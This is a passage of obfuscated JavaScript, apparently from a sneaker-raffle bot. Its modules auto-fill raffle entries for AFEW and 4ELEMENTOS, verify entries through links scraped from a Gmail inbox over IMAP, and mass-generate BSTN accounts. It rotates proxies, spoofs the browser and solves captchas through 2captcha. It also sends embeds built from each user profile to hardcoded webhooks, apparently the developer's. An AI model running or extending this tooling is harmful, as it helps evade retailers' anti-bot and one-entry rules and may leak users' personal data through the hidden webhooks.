                            console['log'](_0x15866d() + '\x20[' + _0x4b4708['name'] + ']\x20Task\x20' + (_0x479c21 + 0x1) + '\x20:\x20Checking\x20Information'), await _0x449358['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x506d6f(0x1f4), await _0x449358['type']('input[name=\x22sm-form-email\x22]', _0x141bed[_0x479c21]['Email']), await _0x506d6f(0xc8), await _0x449358['type']('input[name=\x22sm-form-name\x22]', _0x141bed[_0x479c21]['FirstName'] + '\x20' + _0x141bed[_0x479c21]['LastName']), await _0x506d6f(0xc8), await _0x449358['type']('input[name=\x22sm-form-street\x22]', _0x141bed[_0x479c21]['Address1'] + '\x20' + _0x141bed[_0x479c21]['HouseNumber'] + '\x20' + _0x141bed[_0x479c21]['Address2']), await _0x506d6f(0xc8), await _0x449358['type']('input[name=\x22sm-form-city\x22]', _0x141bed[_0x479c21]['City']), await _0x506d6f(0xc8), await _0x449358['type']('input[name=\x22sm-form-province\x22]', _0x141bed[_0x479c21]['State']), await _0x506d6f(0xc8), await _0x449358['type']('input[name=\x22sm-form-zip\x22]', _0x141bed[_0x479c21]['Zip']), await _0x506d6f(0xc8), await _0x449358['type']('input[name=\x22sm-form-country\x22]', _0x141bed[_0x479c21]['Country']), await _0x506d6f(0xc8), await _0x449358['type']('input[name=\x22sm-form-phone\x22]', _0x141bed[_0x479c21]['Phone']), await _0x506d6f(0xc8), await _0x449358['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x141bed[_0x479c21]['Follower']), await _0x506d6f(0xc8), await _0x449358['type']('input[name=\x22sm-cst.size\x22]', _0x141bed[_0x479c21]['Size']), await _0x506d6f(0x1f4), await _0x449358['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x506d6f(0x1f4), await _0x449358['click']('.icheckbox_simple-custom'), await _0x506d6f(0x1f4), console['log'](_0x15866d() + '\x20[' + _0x4b4708['name'] + ']\x20Task\x20' + (_0x479c21 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x449358['$eval']('form', _0x1c6922 => _0x1c6922['submit']()), console['log'](_0x195a86['green'](_0x15866d() + '\x20[' + _0x4b4708['name'] + ']\x20Task\x20' + (_0x479c21 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x3b3bd0 = '';
                            var _0x2cb565 = await _0x52a86e(_0x141bed[_0x479c21], _0x4b4708, 'dev', ![]), _0x25e127 = await _0x52a86e(_0x141bed[_0x479c21], _0x4b4708, 'pub', ![]);
                            const _0x431517 = {
                                'succesDEVMSG': { 'embeds': [_0x2cb565] },
                                'succesPUBMSG': { 'embeds': [_0x25e127] }
                            };
                            try {
                                _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x431517['succesDEVMSG']), await _0x506d6f(0xc8), await _0x57bb0c(_0x39f3e1, _0x431517['succesDEVMSG']), await _0x506d6f(0xc8), await _0x57bb0c(_0x3f4ede, _0x431517['succesPUBMSG']);
                            } catch (_0x348cc7) {
                                console['log'](_0x195a86['yellow'](_0x15866d() + '\x20[' + _0x4b4708['name'] + ']\x20Task\x20' + (_0x479c21 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x348cc7));
                            }
                        } catch (_0x1ab43f) {
                            console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x4b4708['name'] + ']\x20Task\x20' + (_0x479c21 + 0x1) + '\x20:\x20' + _0x1ab43f)), _0x540d4e = '' + _0x1ab43f;
                            var _0x24713e = await _0x52a86e(_0x141bed[_0x479c21], _0x4b4708, 'dev', !![], _0x540d4e), _0x2cb565 = await _0x52a86e(_0x141bed[_0x479c21], _0x4b4708, 'dev', ![]), _0x25e127 = await _0x52a86e(_0x141bed[_0x479c21], _0x4b4708, 'pub', ![]);
                            const _0x2c74b5 = {
                                'succesDEVMSG': { 'embeds': [_0x2cb565] },
                                'succesPUBMSG': { 'embeds': [_0x25e127] }
                            };
                            _0x2c74b5['errorDEV'] = { 'embeds': [_0x24713e] }, _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x2c74b5['errorDEV']), await _0x57bb0c(_0xb4796a, _0x2c74b5['errorDEV']), _0x1ab43f != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x3b3bd0 = 'yes');
                        } finally {
                            _0x38f4a7['close']();
                            if (_0x3b3bd0 == 'yes' && _0x11c4de != 0x5 && _0x540d4e != 'Size\x20Not\x20Found') {
                                console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x4b4708['name'] + ']\x20Task\x20' + (_0x479c21 + 0x1) + '\x20:\x20Retrying')), _0x479c21 = _0x479c21 - 0x1, _0x11c4de = _0x11c4de + 0x1;
                                continue;
                            }
                            _0x3b3bd0 == 'yes' && _0x11c4de >= 0x5 && (_0x5c9ba1(_0x141bed[_0x479c21], _0x4b4708), _0x3b3bd0 = 'no', _0x11c4de = 0x0), console['log'](_0x15866d() + '\x20[' + _0x4b4708['name'] + ']\x20Waiting\x20for\x20' + _0x5f2d88['delay'] + '\x20ms'), await _0x506d6f(_0x5f2d88['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x146678, _0xf2f810) {
                    var _0x5efef6 = [];
                    async function _0x1d251a() {
                        var _0x1cc27e = new _0x40f5d4({
                            'user': _0x5f2d88['masterMail'],
                            'password': _0x5f2d88['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x436cd0(_0x42aabc) {
                            _0x1cc27e['openBox']('INBOX', ![], _0x42aabc);
                        }
                        _0x1cc27e['once']('ready', function () {
                            _0x436cd0(function (_0x4ac302, _0x2a9ead) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x4ac302)
                                    throw _0x4ac302;
                                _0x1cc27e['seq']['search'](['UNSEEN'], function (_0x5254d9, _0x3e45bb) {
                                    if (!_0x3e45bb || !_0x3e45bb['length'])
                                        console['log'](_0x15866d() + '\x20[' + _0x146678['name'] + ']\x20No\x20mails\x20found'), _0x1cc27e['end']();
                                    else {
                                        var _0x276bce = _0x1cc27e['seq']['fetch'](_0x3e45bb, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x276bce['on']('message', function (_0x3e9cc3, _0x24268f) {
                                            var _0x1d0bfd = '(#' + _0x24268f + ')\x20';
                                            _0x3e9cc3['on']('body', function (_0x5a0ac5, _0x5befdf) {
                                                _0xc3daf(_0x5a0ac5, (_0x2465fa, _0x47a698) => {
                                                    if (_0x47a698['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x36f5c3 = _0x47a698['html']['split']('\x0a');
                                                        for (var _0x4848a9 = 0x0; _0x4848a9 < _0x36f5c3['length']; _0x4848a9++) {
                                                            if (_0x36f5c3[_0x4848a9]['includes']('salesmanago') && _0x36f5c3[_0x4848a9]['includes']('<td') && _0x36f5c3[_0x4848a9]['includes']('href')) {
                                                                var _0x28af0f = _0x36f5c3[_0x4848a9]['split']('href=\x22'), _0xdc673e = _0x28af0f[0x1]['split']('\x22')[0x0];
                                                                _0x5efef6['push'](_0xdc673e);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x3e9cc3['once']('end', function () {
                                            });
                                        }), _0x276bce['once']('error', function (_0x55a1c1) {
                                            console['log']('Fetch\x20error:\x20' + _0x55a1c1);
                                        }), _0x276bce['once']('end', function () {
                                            _0x1cc27e['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x1cc27e['once']('error', function (_0x574d0d) {
                            console['log'](_0x195a86['red'](_0x574d0d['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x1cc27e['once']('end', async function () {
                        }), _0x1cc27e['connect']();
                    }
                    async function _0x30b6e3(_0x23d431, _0x3be9b9, _0x46289b) {
                        for (var _0xfb47ef = 0x0; _0xfb47ef < _0x3be9b9['length']; _0xfb47ef++) {
                            async function _0x456575(_0x25d1a0, _0x9a9850, _0x1f8272, _0x4d9a2e, _0x2fbd05) {
                                var _0x191866, _0x50d23d = {}, _0x3c3ffd = [], _0x1597a1 = {}, _0x57ac3b = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x19e0e5 = Math['round'](Math['random']() * (_0x57ac3b['length'] - 0x1));
                                _0x4d9a2e[_0x25d1a0]['Size'] == 'RANDOM' && (_0x4d9a2e[_0x25d1a0]['Size'] = _0x57ac3b[_0x19e0e5]);
                                !_0x4d9a2e && (_0x4d9a2e = {});
                                if (_0x5f2d88['useRandomProxy'] = ![])
                                    var _0x4dfb76 = _0x2fbd05[_0x25d1a0]['split'](':');
                                else
                                    var _0x19a0a3 = Math['round'](Math['random']() * (_0x2fbd05['length'] - 0x1)), _0x4dfb76 = _0x2fbd05[_0x19a0a3]['split'](':');
                                var _0x5a87d7 = {
                                    'jar': _0x26b5a0,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x1f8272['url'],
                                    'headers': _0x1f8272['headers'],
                                    'body': JSON['stringify'](_0x50d23d),
                                    'proxy': 'http://' + _0x4dfb76[0x2] + ':' + _0x4dfb76[0x3] + '@' + _0x4dfb76[0x0] + ':' + _0x4dfb76[0x1]
                                };
                                return _0x9a9850 != 'ver' && (_0x5a87d7['url'] = _0x1f8272['url'], _0x5a87d7['headers'] = _0x1f8272['headers']), _0x9a9850 == 'ver' && (_0x5a87d7['method'] = 'GET', _0x5a87d7['url'] = _0x4d9a2e[_0x25d1a0]), new Promise(function (_0x46ecd2, _0x5be64c) {
                                    callback = async (_0x438889, _0x3962b8, _0x539e33) => {
                                        if (!_0x438889 && _0x3962b8['statusCode'] == 0xca || !_0x438889 && _0x3962b8['statusCode'] == 0xc8) {
                                            if (_0x9a9850 != 'ver') {
                                                var _0x16c932 = await _0x52a86e(_0x4d9a2e[_0x25d1a0], _0x1f8272, 'dev', ![]), _0x1e9a09 = await _0x52a86e(_0x4d9a2e[_0x25d1a0], _0x1f8272, 'pub', ![]);
                                                const _0x315a06 = {
                                                    'succesDEVMSG': { 'embeds': [_0x16c932] },
                                                    'succesPUBMSG': { 'embeds': [_0x1e9a09] }
                                                };
                                                if (_0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '')
                                                    try {
                                                        await _0x57bb0c(_0x5f2d88['webhook'], _0x315a06['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x506d6f(0xc8), await _0x57bb0c(_0x39f3e1, _0x315a06['succesDEVMSG']), await _0x506d6f(0xc8);
                                                try {
                                                    await _0x57bb0c(_0x3f4ede, _0x315a06['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x37d376(_0x4d9a2e[_0x25d1a0], _0x1f8272);
                                            }
                                            _0x46ecd2(console['log'](_0x195a86['green'](_0x15866d() + '\x20[' + _0x1f8272['name'] + ']\x20Task\x20' + (_0x25d1a0 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x9a9850 != 'ver') {
                                                var _0x3fb4c2 = '' + _0x438889, _0x55f36b = await _0x52a86e(_0x4d9a2e[_0x25d1a0], _0x1f8272, 'dev', !![], _0x3fb4c2), _0x1d4ca8 = {};
                                                _0x1d4ca8['errorDEV'] = { 'embeds': [_0x55f36b] }, _0x5c9ba1(_0x4d9a2e[_0x25d1a0], _0x1f8272), _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x1d4ca8['errorDEV']), await _0x57bb0c(_0xb4796a, _0x1d4ca8['errorDEV']);
                                            }
                                            _0x5be64c(console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x1f8272['name'] + ']\x20Task\x20' + (_0x25d1a0 + 0x1) + ':\x20' + _0x438889)));
                                        }
                                    };
                                    try {
                                        _0x9a9850 != 'ver' ? console['log'](_0x15866d() + '\x20[' + _0x1f8272['name'] + ']\x20Task\x20' + (_0x25d1a0 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x50d23d['data']['attributes']['email']) : console['log'](_0x15866d() + '\x20[' + _0x1f8272['name'] + ']\x20Task\x20' + (_0x25d1a0 + 0x1) + ':\x20Fetching\x20Response'), _0x5eed11(_0x5a87d7, callback);
                                    } catch (_0x17e9b2) {
                                        console['log'](_0x15866d() + '\x20Task\x20' + (_0x25d1a0 + 0x1) + ':\x20' + _0x17e9b2);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x456575(_0xfb47ef, 'ver', _0x23d431, _0x3be9b9, _0x46289b), console['log'](_0x15866d() + '\x20[' + _0x23d431['name'] + ']\x20Sleeping\x20for\x20' + _0x5f2d88['delay'] + '\x20ms'), await _0x506d6f(_0x5f2d88['delay']);
                            } catch (_0x49984e) {
                            }
                        }
                    }
                    try {
                        _0x1d251a(), await _0x506d6f(0xfa0), console['log']('Found\x20' + _0x5efef6['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x30b6e3(_0x146678, _0x5efef6, _0xf2f810);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x424635, _0xcfe115, _0xeaf921) {
                for (var _0x12b11f = 0x0; _0x12b11f < _0xcfe115['length']; _0x12b11f++) {
                    _0x5f2d88['AfewDelay'] = _0x5f2d88['delay'];
                    var _0xd17f1e;
                    if (_0xfe2692 != 'yes')
                        var _0xfe2692 = '', _0x3bb4dc = 0x0;
                    var _0x2c1e83 = _0xcfe115[_0x12b11f]['Url'];
                    _0x3d4687(_0x424635['name'] + '\x20Task\x20' + (_0x12b11f + 0x1) + '\x20/\x20' + _0xcfe115['length'] + '\x20||\x20File:\x20' + _0x467f9e + '\x20Proxies:\x20' + _0x175e57), await _0x502cd4(_0xcfe115, _0x12b11f);
                    var _0x16c54b = await _0x52a86e(_0xcfe115[_0x12b11f], _0x424635, 'dev', ![]), _0x50044b = await _0x52a86e(_0xcfe115[_0x12b11f], _0x424635, 'pub', ![]);
                    const _0x398f6d = {
                        'succesDEVMSG': { 'embeds': [_0x16c54b] },
                        'succesPUBMSG': { 'embeds': [_0x50044b] }
                    };
                    if (_0xcfe115[_0x12b11f]['Email'] == '' || _0xcfe115[_0x12b11f]['FirstName'] == '' || _0xcfe115[_0x12b11f]['LastName'] == '' || _0xcfe115[_0x12b11f]['Country'] == '' || _0xcfe115[_0x12b11f]['Size'] == '' || _0xcfe115[_0x12b11f]['Address1'] == '' || _0xcfe115[_0x12b11f]['Zip'] == '') {
                        console['log'](_0x15866d() + '\x20[' + _0x424635['name'] + ']\x20Task\x20' + (_0x12b11f + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x5f2d88['useRandomProxy'] = ![])
                        var _0x537ca8 = _0xeaf921[_0x12b11f]['split'](':');
                    else
                        var _0x560f50 = Math['round'](Math['random']() * (_0xeaf921['length'] - 0x1)), _0x537ca8 = _0xeaf921[_0x560f50]['split'](':');
                    const _0x19d7ae = await _0x3cc012['launch']({
                        'headless': !![],
                        'args': [
                            '--proxy-server=' + _0x537ca8[0x0] + ':' + _0x537ca8[0x1],
                            '--no-sandbox',
                            '--disable-setuid-sandbox'
                        ]
                    });
                    try {
                        const _0x3627b7 = await _0x19d7ae['newPage']();
                        await _0x3627b7['setDefaultNavigationTimeout'](0x1d4c0), await _0x3627b7['authenticate']({
                            'username': '' + _0x537ca8[0x2],
                            'password': '' + _0x537ca8[0x3]
                        }), console['log'](_0x15866d() + '\x20[' + _0x424635['name'] + ']\x20Task\x20' + (_0x12b11f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3627b7['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x3627b7['setRequestInterception'](!![]), _0x3627b7['on']('request', _0x5e6165 => {
                            _0x5e6165['resourceType']() === 'image' || _0x5e6165['resourceType']() === 'font' || _0x5e6165['resourceType']() === 'media' ? _0x5e6165['abort']() : _0x5e6165['continue']();
                        }), await _0x3627b7['goto'](_0x2c1e83, { 'waitUntil': 'networkidle2' }), console['log'](_0x15866d() + '\x20[' + _0x424635['name'] + ']\x20Task\x20' + (_0x12b11f + 0x1) + '\x20:\x20Gathering\x20cookies'), await _0x3627b7['waitForTimeout'](0xfa0), console['log'](_0x15866d() + '\x20[' + _0x424635['name'] + ']\x20Task\x20' + (_0x12b11f + 0x1) + '\x20:\x20Cookies\x20received'), await _0x3627b7['waitForTimeout'](0x320);
                        if (_0xcfe115[_0x12b11f]['Size'] == 'RANDOM') {
                            console['log'](_0x15866d() + '\x20[' + _0x424635['name'] + ']\x20Task\x20' + (_0x12b11f + 0x1) + '\x20:\x20Choosing\x20random\x20size');
                            const _0x4924fc = await _0x3627b7['$$eval']('div.size-picker.mt-2\x20>\x20ul\x20>\x20li\x20>\x20a', _0x29b1e4 => {
                                return _0x29b1e4['map'](_0x405961 => _0x405961['href']);
                            });
                            var _0x4d502a = Math['round'](Math['random']() * (_0x4924fc['length'] - 0x1));
                            await _0x3627b7['goto']('' + _0x4924fc[_0x4d502a]);
                        } else {
                            console['log'](_0x15866d() + '\x20[' + _0x424635['name'] + ']\x20Task\x20' + (_0x12b11f + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0xcfe115[_0x12b11f]['Size']);
                            try {
                                const _0x2f047b = await _0x3627b7['$$eval']('li[data-original-title=\x22Größe\x20in\x20EU:\x20' + _0xcfe115[_0x12b11f]['Size'] + '\x22]\x20>\x20a', _0x866ce => {
                                    return _0x866ce['map'](_0x20c416 => _0x20c416['href']);
                                });
                                await _0x3627b7['goto']('' + _0x2f047b[0x0], { 'waitUntil': 'networkidle2' });
                            } catch (_0x2474f0) {
                                console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x424635['name'] + ']\x20Task\x20' + (_0x12b11f + 0x1) + '\x20:\x20' + _0x2474f0 + '\x20Size\x20not\x20found')), _0xd17f1e = 'Size\x20Not\x20Found';
                                var _0xfe0c02 = await _0x52a86e(_0xcfe115[_0x12b11f], _0x424635, 'dev', !![], _0xd17f1e);
                                _0x398f6d['errorDEV'] = { 'embeds': [_0xfe0c02] };
                                _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x398f6d['errorDEV']);
                                await _0x57bb0c(_0xb4796a, _0x398f6d['errorDEV']);
                                continue;
                            }
                        }
                        await _0x3627b7['waitForTimeout'](0x258), await _0x3627b7['type']('#raffle-instagram', '' + _0xcfe115[_0x12b11f]['Follower'], { 'delay': 0x64 }), await _0x3627b7['waitForTimeout'](0x384), await _0x3627b7['click']('#raffle-terms'), await _0x3627b7['waitForTimeout'](0x384), await _0x3627b7['evaluate'](() => {
                            const _0x3ef363 = document['querySelector']('button.btn[name=\x27add\x27]');
                            _0x3ef363['click']();
                        }), await _0x3627b7['waitForTimeout'](0xbb8), await _0x3627b7['waitForSelector']('#checkout_email'), await _0x506d6f(0x3e8), console['log'](_0x15866d() + '\x20[' + _0x424635['name'] + ']\x20Task\x20' + (_0x12b11f + 0x1) + '\x20:\x20Filling\x20Information'), await _0x3627b7['type']('#checkout_email', '' + _0xcfe115[_0x12b11f]['Email'], 0x32), await _0x506d6f(0x320), await _0x3627b7['select']('#checkout_shipping_address_country', '' + _0xcfe115[_0x12b11f]['Country']), await _0x3627b7['waitForTimeout'](0x258), await _0x3627b7['type']('#checkout_shipping_address_first_name', '' + _0xcfe115[_0x12b11f]['FirstName']), await _0x3627b7['waitForTimeout'](0x320), await _0x3627b7['type']('#checkout_shipping_address_last_name', '' + _0xcfe115[_0x12b11f]['LastName']), await _0x3627b7['waitForTimeout'](0x2bc), await _0x3627b7['type']('#checkout_shipping_address_address1', _0xcfe115[_0x12b11f]['Address1'] + '\x20' + _0xcfe115[_0x12b11f]['HouseNumber']), await _0x3627b7['waitForTimeout'](0x2bc), await _0x3627b7['type']('#checkout_shipping_address_address2', '' + _0xcfe115[_0x12b11f]['Address2']), await _0x3627b7['waitForTimeout'](0x2bc);
                        _0xcfe115[_0x12b11f]['Postcode'] == undefined ? await _0x3627b7['type']('#checkout_shipping_address_zip', '' + _0xcfe115[_0x12b11f]['Zip']) : await _0x3627b7['type']('#checkout_shipping_address_zip', '' + _0xcfe115[_0x12b11f]['Postcode']);
                        await _0x3627b7['waitForTimeout'](0x2bc), await _0x3627b7['type']('#checkout_shipping_address_city', '' + _0xcfe115[_0x12b11f]['City']), await _0x3627b7['waitForTimeout'](0x2bc), console['log'](_0x15866d() + '\x20[' + _0x424635['name'] + ']\x20Task\x20' + (_0x12b11f + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x3627b7, _0x3627b7['evaluate'](() => {
                            const _0x5c30d4 = document['querySelector']('#continue_button');
                            for (var _0x188df6 = 0x0; _0x188df6 < 0x5; _0x188df6++) {
                                if (_0x5c30d4) {
                                    _0x5c30d4['click'](), _0x5c30d4['click']();
                                    break;
                                } else
                                    _0x506d6f(0xfa0);
                            }
                        }), await _0x3627b7['waitForTimeout'](0x1194);
                        try {
                            await _0x3627b7['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
                        } catch {
                            console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x424635['name'] + ']\x20Task\x20' + (_0x12b11f + 0x1) + '\x20:\x20Proxy\x20Error'));
                            continue;
                        }
                        _0x3627b7['evaluate'](() => {
                            const _0x9bb4cd = document['querySelector']('#continue_button');
                            for (var _0x1b1599 = 0x0; _0x1b1599 < 0x5; _0x1b1599++) {
                                if (_0x9bb4cd) {
                                    _0x9bb4cd['click']();
                                    break;
                                } else
                                    _0x506d6f(0xfa0);
                            }
                        }), await _0x3627b7['waitForTimeout'](0x7d0), console['log'](_0x15866d() + '\x20[' + _0x424635['name'] + ']\x20Task\x20' + (_0x12b11f + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x3627b7['waitForSelector']('#continue_button', { 'timeout': 0x186a0 }), _0x3627b7['evaluate'](() => {
                            const _0x23d033 = document['querySelector']('#continue_button');
                            for (var _0x2504e5 = 0x0; _0x2504e5 < 0x5; _0x2504e5++) {
                                if (_0x23d033) {
                                    _0x23d033['click']();
                                    break;
                                } else
                                    _0x506d6f(0xfa0);
                            }
                        }), await _0x3627b7['waitForTimeout'](0x1194), await _0x3627b7['waitForSelector']('#continue_button'), _0x3627b7['evaluate'](() => {
                            const _0x6ca57b = document['querySelector']('#continue_button');
                            for (var _0x233117 = 0x0; _0x233117 < 0x5; _0x233117++) {
                                if (_0x6ca57b) {
                                    _0x6ca57b['click']();
                                    break;
                                } else
                                    _0x506d6f(0xfa0);
                            }
                        });
                        try {
                            await _0x3627b7['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0xfe2692 = 'no', _0x37d376(_0xcfe115[_0x12b11f], _0x424635), console['log'](_0x195a86['green'](_0x15866d() + '\x20[' + _0x424635['name'] + ']\x20Task\x20' + (_0x12b11f + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '')
                                try {
                                    await _0x57bb0c(_0x5f2d88['webhook'], _0x398f6d['succesDEVMSG']);
                                } catch {
                                }
                            await _0x506d6f(0xc8), await _0x57bb0c(_0x39f3e1, _0x398f6d['succesDEVMSG']), await _0x506d6f(0xc8);
                            try {
                                await _0x57bb0c(_0x3f4ede, _0x398f6d['succesPUBMSG']);
                            } catch {
                            }
                        } catch (_0x536227) {
                            console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x424635['name'] + ']\x20Task\x20' + (_0x12b11f + 0x1) + '\x20:\x20Entry\x20Failed:\x20' + _0x536227));
                        }
                    } catch (_0x1bfd93) {
                        console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x424635['name'] + ']\x20Task\x20' + (_0x12b11f + 0x1) + '\x20:\x20' + _0x1bfd93)), _0xd17f1e = '' + _0x1bfd93;
                        var _0xfe0c02 = await _0x52a86e(_0xcfe115[_0x12b11f], _0x424635, 'dev', !![], _0xd17f1e);
                        _0x398f6d['errorDEV'] = { 'embeds': [_0xfe0c02] }, _0x5f2d88['webhook'] != undefined && _0x5f2d88['webhook'] != '' && await _0x57bb0c(_0x5f2d88['webhook'], _0x398f6d['errorDEV']), await _0x57bb0c(_0xb4796a, _0x398f6d['errorDEV']), _0xfe2692 = 'yes';
                    } finally {
                        _0x19d7ae && _0x19d7ae['close']();
                        if (_0xfe2692 == 'yes' && _0x3bb4dc != 0x5 && _0xd17f1e != 'Size\x20Not\x20Found') {
                            console['log'](_0x195a86['red'](_0x15866d() + '\x20[' + _0x424635['name'] + ']\x20Task\x20' + (_0x12b11f + 0x1) + '\x20:\x20Retrying')), _0x12b11f = _0x12b11f - 0x1, _0x3bb4dc = _0x3bb4dc + 0x1;
                            continue;
                        }
                        _0xfe2692 == 'yes' && _0x3bb4dc >= 0x5 && (_0x5c9ba1(_0xcfe115[_0x12b11f], _0x424635), _0xfe2692 = 'no', _0x3bb4dc = 0x0);
                        if (_0x12b11f + 0x1 == _0xcfe115['length']) {
                            await _0x506d6f(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x5f2d88['AfewDelay'] + '\x20ms'), await _0x506d6f(_0x5f2d88['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x13b375, _0x224d56, _0x430a7e) {
                    _0x3cc012['use'](_0x28795e()), _0x3cc012['use'](_0x4cda3c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5f2d88['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xbb5f4a = 0x0; _0xbb5f4a < _0x224d56['length']; _0xbb5f4a++) {
                        if (_0x208f33 != 'yes')
                            var _0x208f33 = '', _0x2e2839 = 0x0;
                        var _0x96bd3b;
                        await _0x502cd4(_0x224d56, _0xbb5f4a), _0x3d4687(_0x13b375['name'] + '\x20Task\x20' + (_0xbb5f4a + 0x1) + '\x20/\x20' + _0x224d56['length'] + '\x20||\x20File:\x20' + _0x467f9e + '\x20Proxies:\x20' + _0x175e57);
                        var _0x21b1d5 = await _0x52a86e(_0x224d56[_0xbb5f4a], _0x13b375, 'acc', ![]);
                        const _0x4a80b8 = { 'succesDEVMSG': { 'embeds': [_0x21b1d5] } }, _0x582c09 = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x496326 = Math['round'](Math['random']() * (_0x430a7e['length'] - 0x1)), _0x49fa6c = _0x430a7e[_0x496326]['split'](':');
                        const _0x1ce296 = await _0x3cc012['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x49fa6c[0x0] + ':' + _0x49fa6c[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x3c5dfd = await _0x1ce296['newPage']();
                            await _0x3c5dfd['authenticate']({
                                'username': '' + _0x49fa6c[0x2],
                                'password': '' + _0x49fa6c[0x3]
                            }), console['log'](_0x15866d() + '\x20[' + _0x13b375['name'] + ']\x20Task\x20' + (_0xbb5f4a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3c5dfd['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x3c5dfd['setRequestInterception'](!![]), _0x3c5dfd['on']('request', _0x3124bc => {
                                _0x3124bc['resourceType']() === 'image' ? _0x3124bc['abort']() : _0x3124bc['continue']();
